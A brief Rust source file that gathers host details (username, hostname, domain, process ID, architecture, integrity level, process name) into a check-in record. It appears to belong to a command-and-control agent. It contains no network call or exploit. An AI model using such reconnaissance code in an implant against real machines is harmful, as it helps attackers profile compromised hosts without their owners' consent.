use crate::proto::checkin::CheckinInfo;

#[cfg(target_os = "linux")]
use crate::native::linux::system;

#[cfg(target_os = "windows")]
use crate::native::windows::system;

pub fn get_checkininfo(uuid: String) -> CheckinInfo {
    CheckinInfo {
        uuid,
        user: system::username().ok(),
        host: system::hostname().ok(),
        domain: system::domain().ok(),
        pid: Some(std::process::id()),
        architecture: system::architecture().into(),
        platform: system::platform(),
        integrity_level: system::integrity_level().ok(),
        process_name: system::process_name().ok(),
        ips: Vec::new(),
    }
}
